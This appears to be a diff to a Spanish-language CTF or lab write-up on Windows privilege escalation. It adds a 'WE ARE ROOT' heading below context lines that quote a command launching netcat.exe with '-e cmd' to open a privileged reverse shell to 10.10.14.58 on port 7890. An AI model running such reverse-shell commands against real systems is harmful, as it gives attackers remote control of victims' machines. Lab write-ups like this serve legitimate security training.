@@ -259,3 +259,5 @@ subimos la herramienta a la maquina victima
 ```
 con este comando lanzamos la herramienta para que ejecute `C:\Windows\System32\cmd.exe -a "/c C:\Temp\netcat.exe -e cmd 10.10.14.58 7890"` ya que tenemos el `netcat.exe` que lo hemos cargado anteriormente podemos lanzarlo de manera privilegiada
 ![[Pasted image 20240402010411.png]]
+
+### WE ARE ROOT
